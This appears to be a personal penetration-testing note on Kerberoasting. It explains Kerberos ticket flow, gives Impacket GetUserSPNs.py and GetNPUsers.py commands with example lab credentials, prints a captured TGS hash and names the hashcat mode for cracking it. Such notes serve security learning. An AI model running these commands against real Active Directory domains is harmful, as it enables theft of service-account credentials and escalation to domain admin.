### What is Kerberoasting
Kerberoasting can be an effective method for extracting service account credentials from Active Directory as a regular user without sending any packets to the target system. This attack is effective since people tend to create poor passwords. The reason why this attack is successful is that most service account passwords are the same length as the domain password minimum (often 10 or 12 characters long) meaning that even brute force cracking doesn’t likely take longer than the password maximum password age (expiration). Most service accounts don’t have passwords set to expire, so it’s likely the same password will be in effect for months if not years. Furthermore, most service accounts are not designed as per the principle of least privilege and are often members of Domain Admins providing full admin rights to Active Directory (even when the service account only needs to modify an attribute on certain object types or admin rights on specific servers)

![[Pasted image 20210727101809.png]]

#### Steps of authentication
   1. When a user logs on to Active Directory, the user authenticates to the Domain Controller (DC) using the user’s password which of course the DC knows.
   2. The DC sends the user a Ticket Granting Ticket (TGT) Kerberos ticket. The TGT is presented to any DC to prove authentication for Kerberos service tickets.
   3. The user opens up Skype which causes the user’s workstation to lookup the Service Principal Name (SPN) for the user’s Exchange server.
   4.  Once the SPN is identified, the computer communicates with a DC again and presents the user’s TGT as well as the SPN for the resource to which the user needs to communicate.
    5. The DC replies with the Ticket Granting Service (TGS) Kerberos service ticket.
    6. The user’s workstation presents the TGS to the Exchange server for access.
    7. Skype connects successfully.

Now imagine if you have credentials of a local user in a network then you can perform Kerberoasting. If you can get the tgs hash we can crack it and log in to other domain accounts

For doing so we will use `GetUserSPNs.py` from impacket module.
```bash
# Syntax for performing Kerberoasting
GetUserSPNs.py <Domain Name>/<username>:<Password> -dc-ip <IP Address of the DC> -request

# Example
GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.247.129 -request
```

Now hit enter and you will get a hash

![[Pasted image 20210727103112.png]]

```bash
44fbbf3dfdb85303b9c43dddcb496f08341d61837bc2e2c7f922e7fd4b4bbd72c7d9251fd083c5c113d08b21105797f61c0280b6d5a25f9cf992c48324948ae2fe3a402d65f7dcbd21c124a6ff8bde5841cceae284fe0854f9ad4b0e46eea2f03767255f056d3bf34890f127113c80e15c896ae96268d6ad1263ad9a282bff19c5f88a7057a26ddd7eac849a4b8525047a6b6d5360487aa43789b6216d300c1ab4e520851ab2788866e7f04e3452b7da5108fb7029bf9de184568c848041d389ba5dd4b0e72dbbb3e06e90c4ae372af4a43dda46c60fc629459b2b7c344a9750a2ad0fdd9cdf3372de14d8ae54f29bd60546346321fe3c91fd3fba6e411e1581fa6a7811aae215247997d9d7afdf77f6d614f9aadc5f5fe5df821ac292ea1a6c5820b00f2e12c4a6520c00b2a637e27d4494576cae029d1ee57f3a4bc909604da48436cfcee018c84451e34d79bd075305666a992ff467f6372b33a90d3edc5a3d26a938db3281f7a0094e264c37e5728f89933c0814a484576fad7b453c6ef29d4e6cfdd9fd590ade304f16ac5a28e6ab57f82449c41ce0df4183caaed029ef9cea6a8380b6f397d85a79c902ae5c9efd1fdf897d4cd80465a165356105fbf9d1d11843a6294aaf764caf0812751ce8be3844bc7d2c937d9c424fad79d0a9f052125dbf2c5429716e31a6cef08285680e380c9e2d44a3a0caae5a5c2f9820c0a8beae07834fb7a9e681aa92f9c4af9f0f9a4cbd660e1a9c307b0bf8189c72b2297ee71dd64f47b5cb785c4d74fe94457d0849e2b83d076c0ead0d9eb7129c76175198335925e390acebd138cfdf199b86ba152815ace74c60d1026fc551e72ddca4e1a937090179c08e7d8b421e8e0fc996a383e06ab868f5302319ceb3847445757c212a1c66811d5ba5afe0a074a299e76c1cbbdfc825b697b5471af07a8b0cba0cf17d3fb9fea51eedadd75113adbc4cfb3d82f18b3dc17450e1308029fa9fd885fa60916e7b67d7f32f1ac28317409b1716d9778ee7a48a7e05f07e7092e5d96b044a5bc5b80a7904a06e017e4a72f57c466b80cbc402b16f9726053de5bf7a2033e1e348ff8b3a020993068d6826bea85e0092e0c435649732ccd4fdc425c153b72e5a42e9da1cd9c14306d4fa4d83450895a44716c9ccbd428c15fb1a17d70f4ce4906c6cd8dd65a275455896cafda17b4a4497b52e809b4fe3f810d2998b40f78efded8508
```

Now use hashcat to crack TGS hashes

![[Pasted image 20210727103342.png]]

The mode is `13100`

![[Pasted image 20210727103452.png]]

You can see the hash is cracked and it is a SQL.Service password which is the part of domain admins


**Note** -` python3 /opt/impacket/examples/GetNPUsers.py 'VULNNET-RST/' -usersfile users.txt -no-pass -dc-ip $IP`
without pass

### Defenses
![[Pasted image 20210727103616.png]]

### Must Read
https://medium.com/@Shorty420/kerberoasting-9108477279cc 